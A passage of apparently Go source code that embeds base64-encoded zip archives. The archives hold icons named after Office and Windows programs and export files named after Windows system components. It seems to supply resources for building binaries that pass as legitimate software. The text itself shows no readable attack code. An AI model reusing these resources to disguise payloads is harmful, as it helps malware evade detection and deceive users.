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"
	}
	if name == "control.zip" {
		base64string = "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"
	}
	if name == "wscript.zip" {
		base64string = "UEsDBBQAAAAIAIWWaFTG9vRvUwEAAIwDAAAJABwAQVBNb24uZXhwVVQJAAPapSdi+OAoYnV4CwABBOgDAAAE6AMAAEtpY2EAgSOMDAxiYBYLg15JakUJA36gwBCQoJeSWJJIQJ0DQ8ABvaTiYgLKGBpA6lJRDZwBxFuA2IcRwucBm2fgAGLfWqqeBKI1gJgR7GoINgFiFyAOAWLHAN/8PL2UnBws9sUAcR7YXgaGKWARRgYmBmYGl5wc99QS55zE4mL/pKzU5BKQSFBqemZxSWpRcGpRWWoRSCQ0rwhVLKg0D+w+ASBmZpCBsxTgLBU4C+RGITDLAkgKg1k2QFIEzAJ5TxTMcoHr8ICzfOCsADhLLy0zJxXqr3//GRjSGdMSs2ECUJCXmJsKCy8WsK7EtNK85GJIiEFFQIqKIeEHE8kvSimGhCZEJM8QEX5QESOoDQgRY1icwkVMICJT4CLIaQwUf8yMmHGEnL6YcKlBSlvMuNQgpSuw7YyglMWDoY4Fic0EJsUwRDRQRECxzoAiAopHctMQAFBLAwQUAAAACACFlmhUosAokVIBAACMAwAACQAcAGJpc3J2LmV4cFVUCQAD2qUnYvjgKGJ1eAsAAQToAwAABOgDAACdkjtOw0AQhmdtlykQj1QUKZBIZfFIQUERiUhQRMIK0FFgx+vIYBZp14koqThBCi7ADTgABafgMMDOrL2xZUIkVvrXv